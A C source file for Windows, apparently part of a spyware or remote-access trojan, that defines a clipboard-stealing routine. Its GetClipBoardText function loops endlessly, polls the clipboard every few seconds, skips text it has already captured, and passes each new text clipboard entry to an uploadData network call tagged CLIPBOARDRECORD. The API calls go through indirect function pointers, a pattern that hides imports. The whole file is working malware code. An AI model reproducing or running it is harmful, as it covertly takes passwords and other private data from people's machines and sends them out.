#include "../api.h"
#include "../public.h"
#include <windows.h>
#include "../network/NetWorkdata.h"
#include "../log.h"

#define CHECK_CLIPBOARD_LENGTH 16

int __stdcall GetClipBoardText(unsigned long TimeDelay)
{
	unsigned long iTimeDelay = TimeDelay;
	if (TimeDelay == 0)
	{
		iTimeDelay = 6000;
	}
	char  strClipBoardBuf[CHECK_CLIPBOARD_LENGTH] = { 0 };
	int iDataLen = 0;

	while (TRUE)
	{
		lpSleep(iTimeDelay);

		int iRet = lpOpenClipboard(0);
		if (iRet == 0)
		{
			writeLog("GetClipBoardText lpOpenClipboard error\r\n");
			continue;
		}

		//iRet = EmptyClipboard();  
		if (lpIsClipboardFormatAvailable(CF_TEXT))
		{
			HANDLE hClip = lpGetClipboardData(CF_TEXT);
			if (hClip)
			{
				char* pData = (char*)lpGlobalLock(hClip);
				if (pData)
				{
					iDataLen = lplstrlenA(pData);
					if (iDataLen > CHECK_CLIPBOARD_LENGTH)
					{
						if (lpRtlCompareMemory(pData, strClipBoardBuf, CHECK_CLIPBOARD_LENGTH) != CHECK_CLIPBOARD_LENGTH)
						{
							lpRtlMoveMemory(strClipBoardBuf, pData, CHECK_CLIPBOARD_LENGTH);
						}
						else
						{
							lpGlobalUnlock(pData);
							lpCloseClipboard();
							continue;
						}
					}
					else if (iDataLen >= 1 && iDataLen <= CHECK_CLIPBOARD_LENGTH)
					{
						if (lpRtlCompareMemory(pData, strClipBoardBuf, iDataLen) != iDataLen)
						{
							lpRtlMoveMemory(strClipBoardBuf, pData, iDataLen);
						}
						else
						{
							lpGlobalUnlock(pData);
							lpCloseClipboard();
							continue;
						}
					}
					else
					{
						lpGlobalUnlock(pData);
						lpCloseClipboard();
						continue;
					}

					uploadData(pData, iDataLen, CLIPBOARDRECORD, 0);
					lpGlobalUnlock(pData);
				}
			}
		}

		lpCloseClipboard();
	}

	return FALSE;
}